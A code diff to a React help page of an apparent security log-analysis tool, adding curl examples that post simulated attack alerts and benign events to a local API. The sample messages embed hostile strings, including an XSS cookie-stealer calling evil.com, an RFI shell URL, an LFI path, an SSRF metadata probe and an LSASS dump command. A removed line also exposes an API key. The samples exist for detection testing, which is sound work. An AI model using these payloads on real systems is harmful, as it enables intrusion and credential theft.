@@ -40,6 +40,24 @@ import {
   Loader2,
 } from "lucide-react"
 
+function CurlExample({ label, cmd }: { label: string; cmd: string }) {
+  const [copied, setCopied] = useState(false)
+  return (
+    <div className="bg-background/40 rounded-md border border-border/20 overflow-hidden">
+      <div className="flex items-center justify-between px-3 py-1.5 border-b border-border/15 bg-muted/10">
+        <span className="text-[10px] text-muted-foreground/60 font-medium">{label}</span>
+        <button
+          onClick={() => { navigator.clipboard.writeText(cmd); setCopied(true); setTimeout(() => setCopied(false), 2000) }}
+          className="text-[10px] text-muted-foreground/40 hover:text-muted-foreground flex items-center gap-1"
+        >
+          {copied ? "✓ Copied" : "Copy"}
+        </button>
+      </div>
+      <pre className="text-[10px] font-mono text-foreground/60 whitespace-pre-wrap break-all px-3 py-2 leading-relaxed overflow-x-auto">{cmd}</pre>
+    </div>
+  )
+}
+
 function SectionCard({
   title,
   description,
@@ -793,51 +811,120 @@ Model default: gpt-4.1-nano`}
 
       {/* Help */}
       <TabsContent value="help" className="mt-4 flex flex-col gap-5">
-        <SectionCard title="API Ingestion Examples" description="How to send logs to the REST API using curl or Postman" icon={HelpCircle}>
+
+        {/* Endpoint reference */}
+        <SectionCard title="API Reference" description="Endpoint, auth, and accepted fields" icon={HelpCircle}>
           <div className="flex flex-col gap-3">
             <div className="bg-background/40 rounded-md p-3 border border-border/20">
-              <p className="text-[11px] text-muted-foreground mb-1">Endpoint:</p>
-              <code className="text-[11px] font-mono text-foreground/70">POST https://your-server:{apiPort}/api/v1/logs</code>
+              <p className="text-[11px] text-muted-foreground mb-1">Endpoint</p>
+              <code className="text-[11px] font-mono text-foreground/70">POST http://localhost:3000/api/v1/logs</code>
+              <br/>
+              <code className="text-[11px] font-mono text-foreground/50">POST https://your-server:{apiPort}/api/v1/logs</code>
             </div>
-
-            <div className="bg-background/40 rounded-md p-3 border border-border/20">
-              <p className="text-[11px] text-muted-foreground mb-2">Single log (curl):</p>
-              <pre className="text-[11px] font-mono text-foreground/70 whitespace-pre-wrap">{`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: sk-beacon-fPGFZryFBuUAL-An" -d "{\\\"timestamp\\\":\\\"2026-01-22T13:09:00.000Z\\\",\\\"source\\\":\\\"DB-Server-01\\\",\\\"message\\\":\\\"SELECT * FROM users WHERE email='admin@example.com' duration=12ms\\\",\\\"severity\\\":\\\"info\\\"}"`}</pre>
-            </div>
-
-            <div className="bg-background/40 rounded-md p-3 border border-border/20">
-              <p className="text-[11px] text-muted-foreground mb-2">Batch logs (curl):</p>
-              <pre className="text-[11px] font-mono text-foreground/70 whitespace-pre-wrap">{`curl -X POST "https://your-server:${apiPort}/api/v1/logs" \\
-  -H "Content-Type: application/json" \\
-  -H "Authorization: Bearer ${apiKey || "sk-beacon-..."}" \\
-  -d '[
-    { "timestamp": "2026-02-21T16:32:00.000Z", "source": "EDR-Agent-07", "message": "ALERT: Process injection detected", "severity": "critical" },
-    { "timestamp": "2026-02-21T16:33:15.000Z", "source": "DNS-Monitor", "message": "Query: suspicious-c2-domain.top IN TXT", "severity": "medium" }
-  ]'`}</pre>
-            </div>
-
-            <div className="bg-background/40 rounded-md p-3 border border-border/20">
-              <p className="text-[11px] text-muted-foreground mb-2">Postman:</p>
-              <ul className="text-[11px] text-muted-foreground list-disc pl-4 space-y-1">
-                <li>Method: POST</li>
-                <li>URL: https://your-server:{apiPort}/api/v1/logs</li>
-                <li>Headers: Content-Type = application/json</li>
-                <li>Headers: x-api-key = {apiKey || "sk-beacon-..."}</li>
-                <li>Body: raw JSON (same as the curl examples)</li>
-              </ul>
-            </div>
-
-            <div className="bg-background/40 rounded-md p-3 border border-border/20">
-              <p className="text-[11px] text-muted-foreground mb-2">Accepted fields:</p>
-              <ul className="text-[11px] text-muted-foreground list-disc pl-4 space-y-1">
-                <li>message (or msg or log) is required</li>
-                <li>timestamp (or time) is optional</li>
-                <li>source (or host) defaults to API</li>
-                <li>severity (or level) supports: critical, high, medium, low, info</li>
-              </ul>
+            <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
+              <div className="bg-background/40 rounded-md p-3 border border-border/20">
+                <p className="text-[11px] text-muted-foreground mb-1.5">Required headers</p>
+                <ul className="text-[11px] font-mono text-foreground/60 space-y-0.5">
+                  <li>Content-Type: application/json</li>
+                  <li>x-api-key: {apiKey || "sk-beacon-..."}</li>
+                </ul>
+              </div>
+              <div className="bg-background/40 rounded-md p-3 border border-border/20">
+                <p className="text-[11px] text-muted-foreground mb-1.5">Accepted body fields</p>
+                <ul className="text-[11px] text-muted-foreground space-y-0.5">
+                  <li><span className="font-mono text-foreground/70">message</span> · required (alias: msg, log)</li>
+                  <li><span className="font-mono text-foreground/70">source</span> · optional (alias: host)</li>
+                  <li><span className="font-mono text-foreground/70">severity</span> · critical|high|medium|low|info</li>
+                  <li><span className="font-mono text-foreground/70">timestamp</span> · ISO 8601 (alias: time)</li>
+                </ul>
+              </div>
             </div>
           </div>
         </SectionCard>
+
+        {/* Web Server Attacks */}
+        <SectionCard title="Web Server Attacks" description="SQL injection, XSS, LFI, RFI, scanners — severity auto-detected from message" icon={HelpCircle}>
+          <div className="flex flex-col gap-2">
+            <CurlExample label="SQL Injection — UNION SELECT" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"ModSecurity SQL Injection attack detected uri=/api/users?id=1 UNION SELECT 1,2,username,password FROM admin_users-- src=203.0.113.55\\"}"`} />
+            <CurlExample label="SQL Injection — DROP TABLE / stacked" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"ALERT SQL injection blocked: POST /login payload=admin'--; DROP TABLE users-- src_ip=45.33.32.156 status=403\\"}"`} />
+            <CurlExample label="XSS — reflected script injection" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"XSS attempt: GET /search?q=<script>document.location='http://evil.com/?c='+document.cookie</script> src=198.51.100.10 blocked\\"}"`} />
+            <CurlExample label="LFI — Local File Inclusion" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"LFI attack: GET /index.php?page=../../../../etc/passwd HTTP/1.1 403 src=45.33.32.156 ua=Nikto\\"}"`} />
+            <CurlExample label="RFI — Remote File Inclusion" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"RFI exploit attempt: GET /page.php?url=http://attacker.ru/shell.php?cmd=id src=91.121.87.45 blocked\\"}"`} />
+            <CurlExample label="Web shell upload attempt" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Web shell upload detected: POST /upload filename=shell.php.jpg PHP eval() found in binary src=185.220.101.10\\"}"`} />
+            <CurlExample label="Nikto web scanner" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Nikto scanner detected ua=Nikto/2.5.0 src=45.33.32.156 requests=2847 paths=/admin /phpMyAdmin /wp-login.php /.env rate-limited\\"}"`} />
+            <CurlExample label="SSRF — internal service probe" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"SSRF exploit: POST /api/fetch url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ src=203.0.113.77 blocked\\"}"`} />
+          </div>
+        </SectionCard>
+
+        {/* Authentication Attacks */}
+        <SectionCard title="Authentication & Credential Attacks" description="Brute force, spray, stuffing, Kerberos attacks" icon={HelpCircle}>
+          <div className="flex flex-col gap-2">
+            <CurlExample label="SSH brute force" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"SSH brute force: 347 failed login attempts user=root from 198.51.100.22 in 8 minutes\\"}"`} />
+            <CurlExample label="AD password spray" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"EventID=4625 Logon Type=3 failed for multiple accounts: administrator finance_admin svc_backup from src=10.0.4.12 in 2 minutes - password spray\\"}"`} />
+            <CurlExample label="Account lockout" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"EventID=4740 Account locked out user=finance_admin after 5 failed attempts src_ip=10.0.4.12 lockout_duration=30min\\"}"`} />
+            <CurlExample label="Credential stuffing — web" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Credential stuffing: POST /login 1240 requests in 3min success_rate=2.1% src=45.33.32.200 ua=python-requests rate-limit triggered\\"}"`} />
+            <CurlExample label="Kerberoasting attack" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Kerberoasting detected: 47 TGS-REQ for RC4-encrypted service tickets from user=jdoe src=10.0.2.88 EventID=4769 in 30sec\\"}"`} />
+            <CurlExample label="Golden Ticket" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Kerberos anomaly: TGT lifetime >10h for user=svc_backup possible golden ticket attack EventID=4769 src=10.0.2.88\\"}"`} />
+            <CurlExample label="Pass-the-Hash" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Pass-the-Hash: NTLM auth without interactive logon user=CORP\\\\administrator src=10.0.2.88 dst=10.0.1.15 EventID=4624 LogonType=3\\"}"`} />
+          </div>
+        </SectionCard>
+
+        {/* Endpoint & Malware */}
+        <SectionCard title="Endpoint & Malware" description="Process injection, PowerShell, ransomware, persistence" icon={HelpCircle}>
+          <div className="flex flex-col gap-2">
+            <CurlExample label="PowerShell encoded command" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Suspicious process: powershell.exe -ExecutionPolicy Bypass -enc SQBFAFgA... parent=WINWORD.EXE user=jdoe DownloadString IEX\\"}"`} />
+            <CurlExample label="Mimikatz / LSASS dump" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"ALERT mimikatz sekurlsa lsass dump: procdump64.exe -ma lsass.exe C:\\\\Users\\\\Public\\\\lsass.dmp EventID=10 GrantedAccess=0x1fffff\\"}"`} />
+            <CurlExample label="Process injection — LSASS" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"ALERT process injection: svchost.exe PID=4412 -> lsass.exe PID=672 credential dump blocked Mimikatz_Memory_Signature\\"}"`} />
+            <CurlExample label="Ransomware — mass encryption" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Ransomware: 3420 files renamed .lockbit extension in 90sec proc=update.exe user=jdoe - your files have been encrypted bitcoin ransom\\"}"`} />
+            <CurlExample label="Cobalt Strike beacon" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"CobaltStrike beacon detected: traffic 10.0.1.15:49832 -> 198.51.100.44:443 beacon interval=60s jitter=20% c2 command-and-control callback\\"}"`} />
+            <CurlExample label="Scheduled task persistence" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"EventID=1 schtasks.exe /create /tn SystemHealthCheck /tr powershell.exe -File C:\\\\ProgramData\\\\check.ps1 /sc onstart /ru SYSTEM parent=cmd.exe\\"}"`} />
+            <CurlExample label="Registry run key persistence" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"EventID=13 Registry HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run value=Updater data=C:\\\\Users\\\\jdoe\\\\AppData\\\\Roaming\\\\update.exe\\"}"`} />
+            <CurlExample label="Macro phishing email" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Quarantined: Invoice_2026.xlsm from billing@quickb00ks-support.com OLE macro AutoOpen() WScript.Shell detected\\"}"`} />
+          </div>
+        </SectionCard>
+
+        {/* Network & C2 */}
+        <SectionCard title="Network, C2 & Exfiltration" description="TOR, DNS tunneling, C2 beacons, data exfiltration" icon={HelpCircle}>
+          <div className="flex flex-col gap-2">
+            <CurlExample label="TOR exit node" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"TOR exit node connection: src=10.0.1.45 dst=185.220.101.33 bytes_out=2300MB duration=4h - tor network anonymizer\\"}"`} />
+            <CurlExample label="DNS tunneling" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"DNS tunneling suspected: client=10.0.6.30 query=MFZGC3TBNVSA.data.update-service.xyz IN TXT entropy=4.8 dns exfiltration unusual long dns record\\"}"`} />
+            <CurlExample label="C2 beacon HTTP" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"C2 command-and-control callback: src=10.0.5.77 dst=91.121.87.45 /jquery-3.3.1.min.js beacon interval=60s jitter=15% malleable c2\\"}"`} />
+            <CurlExample label="Data exfiltration — large upload" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Unusual outbound data: src=10.0.3.55 dst=104.21.44.7:443 bytes_out=18.4GB in 2h - baseline <100MB/day possible exfiltration\\"}"`} />
+            <CurlExample label="SMB lateral movement" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Lateral movement: EventID=5140 Share=C$ user=svc_backup from 10.0.1.100 to 12 hosts in 30min - psexec evil-winrm abnormal\\"}"`} />
+            <CurlExample label="Malware domain" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"BLOCKED: Connection to known malware domain evil-payload.ru from src=10.0.5.77 - threat intel Abuse.ch AlienVault OTX\\"}"`} />
+          </div>
+        </SectionCard>
+
+        {/* Cloud */}
+        <SectionCard title="Cloud & Infrastructure" description="AWS, Azure, GCP IAM changes and misconfigurations" icon={HelpCircle}>
+          <div className="flex flex-col gap-2">
+            <CurlExample label="AWS IAM privilege escalation" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"IAM privilege escalation: eventName=PutRolePolicy user=devops-intern role=lambda-processor added AdministratorAccess region=us-east-1\\"}"`} />
+            <CurlExample label="S3 bucket made public" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"S3 ACL breach: PutBucketAcl bucket=corp-finance-reports-2026 new_acl=public-read user=devops-admin - data exposure\\"}"`} />
+            <CurlExample label="Azure AD impossible travel" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Impossible travel: user=j.smith@corp.com login New York 09:00 Moscow 09:45 - travel time impossible risk_score=95\\"}"`} />
+            <CurlExample label="GCP service account key" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"GCP service account key created: data-processor@prod.iam.gserviceaccount.com by developer@corp.com key_type=USER_MANAGED\\"}"`} />
+          </div>
+        </SectionCard>
+
+        {/* Clear False Positives */}
+        <SectionCard title="False Positives — Routine Activity" description="Normal events that should score low risk" icon={HelpCircle}>
+          <div className="flex flex-col gap-2">
+            <CurlExample label="Routine DB query" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"SELECT * FROM users WHERE email='admin@example.com' rows=1 duration=12ms user=app_readonly\\"}"`} />
+            <CurlExample label="Nightly backup completed" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Backup completed: job=nightly-full target=NAS-01 duration=42min files=182491 size=234GB status=success\\"}"`} />
+            <CurlExample label="Normal user login" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Successful authentication user=jdoe src_ip=10.0.1.50 method=Kerberos workstation=WS-050 EventID=4624 LogonType=2\\"}"`} />
+            <CurlExample label="Windows Update" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Windows Update KB5034441 installed successfully host=WS-050 version=10.0.19045.4046 initiated_by=wsus-auto\\"}"`} />
+            <CurlExample label="Authorized IT admin session" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"RDP session opened user=it-admin src=10.0.0.5 dst=SRV-DB-01 EventID=4624 LogonType=10 change=CHG-2026-0215 authorized\\"}"`} />
+            <CurlExample label="Authorized pentest scan" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"Vulnerability scan: nessus src=10.0.0.10 target=10.0.0.0/24 policy=Internal authorized_by=CISO change=CHG-2026-0199\\"}"`} />
+            <CurlExample label="Normal DNS lookup" cmd={`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "{\\"message\\":\\"DNS query: client=10.0.1.50 query=www.microsoft.com type=A response=20.190.159.5 ttl=300\\"}"`} />
+          </div>
+        </SectionCard>
+
+        {/* Batch example */}
+        <SectionCard title="Batch Ingestion" description="Send multiple logs in one request — mix threat types" icon={HelpCircle}>
+          <div className="bg-background/40 rounded-md p-3 border border-border/20">
+            <pre className="text-[11px] font-mono text-foreground/70 whitespace-pre-wrap overflow-x-auto">{`curl.exe -X POST "http://localhost:3000/api/v1/logs" -H "Content-Type: application/json" -H "x-api-key: ${apiKey || "sk-beacon-..."}" -d "[{\\"message\\":\\"CobaltStrike beacon detected c2 command-and-control callback 198.51.100.44\\"},{\\"message\\":\\"mimikatz lsass dump credential dumping svchost.exe -> lsass.exe\\"},{\\"message\\":\\"SQL injection UNION SELECT username password FROM admin_users src=203.0.113.55\\"},{\\"message\\":\\"DNS tunneling TXT query MFZGC3TBNVSA.update-service.xyz high entropy\\"},{\\"message\\":\\"SELECT * FROM orders WHERE id=42 duration=3ms user=app_readonly\\"}]"`}</pre>
+          </div>
+        </SectionCard>
+
       </TabsContent>
     </Tabs>
   )
